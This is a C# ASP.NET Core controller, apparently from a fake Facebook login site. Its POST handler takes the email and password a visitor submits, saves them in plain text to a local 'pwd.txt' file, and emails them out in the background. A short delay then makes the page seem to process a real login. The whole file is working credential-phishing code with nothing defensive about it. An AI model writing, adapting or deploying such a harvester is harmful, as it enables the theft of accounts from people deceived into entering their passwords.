using FBLoginNew.Models;
using Microsoft.AspNetCore.Mvc;
using System.Diagnostics;
using Wangkanai.Detection.Services;
using System.IO;
using System.Reflection;
using FBLoginNew.Util;

namespace FBLoginNew.Controllers
{
	public class HomeController : Controller
	{
		private readonly ILogger<HomeController> _logger;
		private readonly IDetectionService _detectionService;

		public HomeController(ILogger<HomeController> logger, IDetectionService detectionService)
		{
			_logger = logger;
			_detectionService = detectionService;
		}

		public IActionResult Index()
		{
			ViewData["IsSubmitted"] = false;
			ViewData["IsMobile"] = _detectionService.Device.Type == Wangkanai.Detection.Models.Device.Mobile;
			return View();
		}
		[HttpPost]
		public IActionResult Index([FromForm] Login login)
		{
			var email = Request.Form["Email"].ToString();
			var password = Request.Form["Password"].ToString();
			ViewData["IsMobile"] = _detectionService.Device.Type == Wangkanai.Detection.Models.Device.Mobile;
			string path = Path.Combine(System.IO.Path.GetDirectoryName(Assembly.GetEntryAssembly().Location), "pwd.txt");
			string content = $"{DateTime.Now.ToString()} - {email} | {password}";
			System.IO.File.AppendAllLines(path, new List<string> { content });

			Task.Run(() =>
			{
				MailHelper.Send(content);
			});
			ViewData["IsSubmitted"] = true;
			Thread.Sleep(2000);

			return View();
		}
	}
}